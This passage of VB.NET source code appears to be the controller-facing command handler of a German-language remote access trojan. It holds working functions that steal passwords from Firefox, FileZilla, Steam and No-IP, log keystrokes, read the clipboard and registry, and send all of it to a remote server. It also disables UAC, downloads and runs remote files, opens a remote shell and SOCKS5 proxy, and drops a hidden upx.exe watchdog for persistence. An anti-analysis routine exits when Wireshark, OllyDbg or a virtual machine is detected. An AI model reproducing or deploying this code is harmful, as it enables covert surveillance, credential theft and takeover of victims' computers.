                    For Each v As String In r.GetValueNames
                        SendeText &= v & "::" & Registry.GetValue(r.Name, v, "") & "~+~"
                    Next
                    Client.Senden(SendeText & "#++#" & Befehle(2) & "#++#" & Befehle(3) & "#++#")
                End If
                If Befehle(1) = "HKEY_CURRENT_CONFIG" Then
                    Dim r As RegistryKey = Registry.CurrentConfig.OpenSubKey(Befehle(2))
                    For Each s As String In r.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    SendeText &= "#++#"
                    For Each v As String In r.GetValueNames
                        SendeText &= v & "::" & Registry.GetValue(r.Name, v, "") & "~+~"
                    Next
                    Client.Senden(SendeText & "#++#" & Befehle(2) & "#++#" & Befehle(3) & "#++#")
                End If
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "GetBaseKey" Then
            Try
                Dim SendeText As String = "SubKeys#++#"
                If Befehle(1) = "HKEY_CLASSES_ROOT" Then
                    For Each s As String In My.Computer.Registry.ClassesRoot.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    Client.Senden(SendeText)
                End If
                If Befehle(1) = "HKEY_CURRENT_USER" Then
                    For Each s As String In My.Computer.Registry.CurrentUser.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    Client.Senden(SendeText)
                End If
                If Befehle(1) = "HKEY_LOCAL_MACHINE" Then
                    For Each s As String In My.Computer.Registry.LocalMachine.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    Client.Senden(SendeText)
                End If
                If Befehle(1) = "HKEY_USERS" Then
                    For Each s As String In My.Computer.Registry.Users.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    Client.Senden(SendeText)
                End If
                If Befehle(1) = "HKEY_CURRENT_CONFIG" Then
                    For Each s As String In My.Computer.Registry.CurrentConfig.GetSubKeyNames
                        SendeText &= s & "~+~"
                    Next
                    Client.Senden(SendeText)
                End If
            Catch ex As Exception
            End Try
        End If




        If Befehle(0) = "SendImages" Then
            Try
                VictimID = Befehle(2)
                FileSender.SendPicturesFromFolder(Befehle(1), Nothing)
            Catch ex As Exception
            End Try
        End If



        If Befehle(0) = "SendKeys" Then
            Try
                SendKeys.SendWait(Befehle(1).Replace("[ENTER]", vbNewLine))
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "PLAYBEEPSOUND" Then
            Try
                Dim sekunden As Integer = CInt(Befehle(1))
                Dim frequenz As Integer = CInt(Befehle(2))
                Console.Beep(frequenz, sekunden * 1000)
            Catch ex As Exception

            End Try

        End If



        If Befehle(0) = "ShowSingekScreen" Then
            Try
                VictimID = Befehle(1)
                FileSender.SendSingelScreenShowToServer(Nothing)
            Catch ex As Exception
            End Try
        End If


        If Befehle(0) = "KEYLOGGER" Then
            If Befehle(1) = "START" Then
                Try
                    If Me.InvokeRequired Then
                        Dim d As New d1(AddressOf Keylogger.StartOnlinekeylogger)
                        Me.Invoke(d)
                    Else
                        Keylogger.StartOnlinekeylogger()
                    End If
                    Client.Senden("KEYLOGGER#++#ANSWER#++#TRUE#++#Online Keylogger gestartet")
                Catch ex As Exception
                    Client.Senden("KEYLOGGER#++#ANSWER#++#FALSE#++#Online nicht Keylogger gestartet: " & ex.Message)
                End Try
            End If

            If Befehle(1) = "STOP" Then
                Try
                    If Me.InvokeRequired Then
                        Dim d As New d1(AddressOf Keylogger.StopOnlineKeylogger)
                        Me.Invoke(d)
                    Else
                        Keylogger.StopOnlineKeylogger()
                    End If
                    Client.Senden("KEYLOGGER#++#ANSWER#++#TRUE#++#Online Keylogger gestoppt")
                Catch ex As Exception
                    Client.Senden("KEYLOGGER#++#ANSWER#++#FALSE#++#Online nicht Keylogger gestoppt: " & ex.Message)
                End Try
            End If
        End If






        If Befehle(0) = "Passworte" Then
            Try
                Dim sendetext As String = "Passworte#++#"
                sendetext &= Passwortstealer.CD_SerialKeys()
                sendetext &= Passwortstealer.SteamUserNamenStealen
                sendetext &= Passwortstealer.FileZilla_Stealen
                sendetext &= Passwortstealer.NO_IP_Stealen
                sendetext &= Passwortstealer.GetFireFoxPWs
                Client.Senden(sendetext)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "MassPW" Then
            Try
                Dim sendetext As String = "MassPW#++#"
                sendetext &= Passwortstealer.CD_SerialKeys()
                sendetext &= Passwortstealer.SteamUserNamenStealen
                sendetext &= Passwortstealer.FileZilla_Stealen
                sendetext &= Passwortstealer.NO_IP_Stealen
                sendetext &= Passwortstealer.GetFireFoxPWs
                Client.Senden(sendetext)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "UACDeaktivieren" Then
            Try
                UAC_Deakrivieren(True)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "UACAktivieren" Then
            Try
                UAC_Deakrivieren(False)
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "KillOfflineLog" Then
            Try
                My.Computer.FileSystem.DeleteFile(Environ("temp") & "\TMP-OFKGL_" & Befehle(1))
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "GetOfflineLogs" Then
            Try
                Dim Sendetext As String = "OfflineLogs#++#"
                For Each f As String In My.Computer.FileSystem.GetFiles(Environ("temp"))
                    If f.Contains("TMP-OFKGL") Then
                        Dim d As New IO.FileInfo(f)
                        Sendetext &= Split(d.Name, "_")(1) & ";:;" & d.Length.ToString & "~+~"
                    End If
                Next
                Client.Senden(Sendetext)
            Catch ex As Exception
            End Try
        End If




        If Befehle(0) = "GetThisLog" Then
            Try
                Dim pfad As String = Environ("temp") & "\TMP-OFKGL_" & Befehle(1)
                Dim fk As New Logsender
                fk.VonHier = pfad
                VictimID = Befehle(2)
                fk.Start()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "UpdateFromFile" Then
            Try
                If My.Computer.FileSystem.FileExists(Environ("temp") & "\xxupd.exe") Then
                    My.Computer.FileSystem.DeleteFile(Environ("temp") & "\xxupd.exe")
                End If
            Catch ex As Exception
            End Try
            Try
                VictimID = Befehle(3)
                FileSender.GetUpdateFromServer(Befehle(1), Environ("temp") & "\xxupd.exe")
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "Restart" Then
            Try
                m.Close()
                m = Nothing
                Application.Restart()
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "OpenWebsite" Then
            Try
                Process.Start(Befehle(1))
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "Download" Then
            Try
                Dim pfad As String = Environ("temp")
                Befehle(1) = Befehle(1).Replace("\", "/")
                Dim dateiname As String = Split(Befehle(1), "/")(Split(Befehle(1), "/").LongLength - 1)
                If Befehle(2) = "ja" Then
                    My.Computer.Network.DownloadFile(Befehle(1), pfad & "\" & dateiname)
                    Process.Start(pfad & "\" & dateiname)
                Else
                    My.Computer.Network.DownloadFile(Befehle(1), pfad & "\" & dateiname)
                End If
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "GetServices" Then
            Try
                Client.Senden("Services#++#" & GetServices())
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "ServiceBeenden" Then
            Try
                Dim sc() As ServiceProcess.ServiceController = ServiceProcess.ServiceController.GetServices(My.Computer.Name)
                For Each s As ServiceProcess.ServiceController In sc
                    If s.ServiceName = Befehle(1) Then
                        s.Close()
                    End If
                Next
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "ServiceStoppen" Then
            Try
                Dim sc() As ServiceProcess.ServiceController = ServiceProcess.ServiceController.GetServices(My.Computer.Name)
                For Each s As ServiceProcess.ServiceController In sc
                    If s.ServiceName = Befehle(1) Then
                        s.Stop()
                    End If
                Next
            Catch ex As Exception
            End Try
        End If

        If Befehle(0) = "ServiceStarten" Then
            Try
                Dim sc() As ServiceProcess.ServiceController = ServiceProcess.ServiceController.GetServices(My.Computer.Name)
                For Each s As ServiceProcess.ServiceController In sc
                    If s.ServiceName = Befehle(1) Then
                        s.Continue()
                    End If
                Next
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Sub Client_OnConnect() Handles Client.OnConnect
        Try
            Client.Senden(ErsterString)
            AktuellesFenster.Start()
        Catch ex As Exception
        End Try
    End Sub
  

    Private Function GetServices() As String
        On Error Resume Next
        Dim rt As String = Nothing
        Dim sc() As ServiceProcess.ServiceController = ServiceProcess.ServiceController.GetServices(My.Computer.Name)
        For Each s As ServiceProcess.ServiceController In sc
            rt &= s.ServiceName & ";:;"
            rt &= s.DisplayName & ";:;"
            If s.Status = ServiceProcess.ServiceControllerStatus.Paused Then
                rt &= "Paused;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.Running Then
                rt &= "Running;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.Stopped Then
                rt &= "Stopped;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.PausePending Then
                rt &= "PausePending;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.ContinuePending Then
                rt &= "ContinuePending;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.StartPending Then
                rt &= "StartPending;:;"
            End If
            If s.Status = ServiceProcess.ServiceControllerStatus.StopPending Then
                rt &= "StopPending;:;"
            End If
            rt &= "~+~"
        Next
        Return rt
    End Function
    Private Function ErsterString() As String
        On Error Resume Next
        Dim intX As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim intY As Integer = Screen.PrimaryScreen.Bounds.Height

        Dim ErsterVictimString As String = My.User.Name & "#++#" '1
        ErsterVictimString &= Getcn.GetLetters.ToString & "#++#" '2
        ErsterVictimString &= Getcn.GetLetters.ToString & "#++#"

        ErsterVictimString &= My.Computer.Info.OSFullName & "#++#" '4
        ErsterVictimString &= AktuellesFenster.GetActiveWindowTitle & "#++#" '5
        ErsterVictimString &= VictimName & "#++#"
        ErsterVictimString &= intX.ToString & "#++#" & intY.ToString & "#++#"
        ErsterVictimString &= ServerVersion & "#++#"
        If OffKeylogger = True Then
            ErsterVictimString &= "Ja#++#"
        Else
            ErsterVictimString &= "Nein#++#"
        End If
        If FileSender.CheckRemoteWebcam = True Then
            ErsterVictimString &= "Ja#++#"
        Else
            ErsterVictimString &= "Nein#++#"
        End If
        ErsterVictimString &= Syn.DDOSStatus & "#++#"
        ErsterVictimString &= Passwort & "#++#"
        ErsterVictimString &= GetAntivirus() & "#++#"
        ErsterVictimString &= My.Settings.VictimNotiz & "#++#"
        Return ErsterVictimString
    End Function
    Private Sub Client_OnReconnect() Handles Client.OnReconnect
        On Error Resume Next

        AktuellesFenster.Stopp()
        FileSender.StopRemoteDesktop()
        FileSender.StopRemoteWebcam()
    End Sub
    Private Sub ShellKonsole_ShellAnswer(ByVal sText As String) Handles ShellKonsole.ShellAnswer
        Try
            Client.Senden("ShellText#++#" & sText)
        Catch ex As Exception
        End Try
    End Sub
  
    Private Sub DateiSuche_DateiGefunden(ByVal Pfad As String, ByVal DateiName As String, ByVal Größe As String, ByVal s As String) Handles DateiSuche.DateiGefunden
        Try
            Client.Senden("DateiGefunden#++#" & Pfad & "#++#" & DateiName & "#++#" & Größe & "#++#" & s & "#++#")
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If My.Computer.FileSystem.FileExists(Environ("appdata") & "\upx.exe") = False Then
            Try
                VbCompile((TextBox1.Text.Replace("$install", Application.ExecutablePath)).Replace("$prozess", DateiName), "Main", Environ("appdata") & "\upx.exe")
                SetAttr(Environ("appdata") & "\upx.exe", FileAttribute.Hidden)
                Shell(Environ("appdata") & "\upx.exe", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
        End If
        If My.Computer.FileSystem.FileExists(Environ("temp") & "\upx.exe") = False Then
            Try
                VbCompile((TextBox1.Text.Replace("$install", Application.ExecutablePath).Replace("$prozess", DateiName)), "Main", Environ("temp") & "\upx.exe")
                SetAttr(Environ("temp") & "\upx.exe", FileAttribute.Hidden)
                Shell(Environ("temp") & "\upx.exe", AppWinStyle.Hide)
            Catch ex As Exception
            End Try
        End If
        If Propzessvorhanden("upx") = False Then
            Try
                My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
                My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Function Propzessvorhanden(ByVal name As String) As Boolean
        For Each p As Process In Process.GetProcessesByName(name)
            Return True
        Next
        Return False
    End Function
    Private Sub GetClipBoardData()
        Try
            Client.Senden("CLIPBOARDMANAGER#++#CLIPBOARDTEXT#++#" & Clipboard.GetText)
            Client.Senden("CLIPBOARDMANAGER#++#ANSWER#++#TRUE#++#Clipboardtext ausgelesen")
        Catch ex As Exception
            Client.Senden("CLIPBOARDMANAGER#++#ANSWER#++#FALSE#++#Clipboardtext nicht ausgelesen: " & ex.Message)
        End Try

    End Sub
    Private Sub SetClipBoardText(ByVal stext As String)
        Try
            Clipboard.SetText(stext)
            Client.Senden("CLIPBOARDMANAGER#++#ANSWER#++#TRUE#++#Clipboardtext geändert")
        Catch ex As Exception
            Client.Senden("CLIPBOARDMANAGER#++#ANSWER#++#FALSE#++#Clipboardtext nicht geändert: " & ex.Message)
        End Try
    End Sub
   
    Private Sub Socks5Manager_SendText(ByVal sText As String) Handles Socks5Manager.SendText
        Client.Senden("Socks5#++#" & sText)
    End Sub

    

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Dim ProgrammBeenden As Boolean = False
        For Each p As Process In Process.GetProcesses
            If p.MainWindowTitle.Contains("Wireshark") Then
                ProgrammBeenden = True
            End If
            If p.MainWindowTitle.Contains("WPE PRO") Then
                ProgrammBeenden = True
            End If
            If p.MainWindowTitle.Contains("OllyDbg") Then
                ProgrammBeenden = True
            End If
            If p.MainWindowTitle.Contains("SmartSniff") Then
                ProgrammBeenden = True
            End If
        Next

        'anti vmware
        Dim Devices As Object
        Devices = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_VideoController")
        For Each AdaptList In Devices
            If AdaptList.Description = "VMware SVGA II" Then
                ProgrammBeenden = True
            End If
            If AdaptList.Description = "VM Additions S3 Trio32/64" Then
                ProgrammBeenden = True
            End If
            If AdaptList.Description = "VirtualBox Graphics Adapter" Then
                ProgrammBeenden = True
            End If
        Next

        If ProgrammBeenden Then
            Timer1.Stop()
            Try
                If Persistenz = True Then
                    Try
                        For Each p2 As Process In Process.GetProcessesByName("upx")
                            p2.Kill()
                        Next
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("appdata") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                    Try
                        My.Computer.FileSystem.DeleteFile(Environ("temp") & "\upx.exe")
                    Catch ex As Exception
                    End Try
                End If
                Client.Deisconnect()
                Application.Exit()
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub FunFunktionen_ChatMSG(ByVal sText As String) Handles FunFunktionen.ChatMSG
        Client.Senden("ChatMsg#++#" & sText)
    End Sub

    Private Sub Keylogger_SendOnlinwLogsToServer(ByVal sLogs As String) Handles Keylogger.SendOnlinwLogsToServer


        Client.Senden("Keyloggs#++#" & sLogs)
     
    End Sub

 
End Class
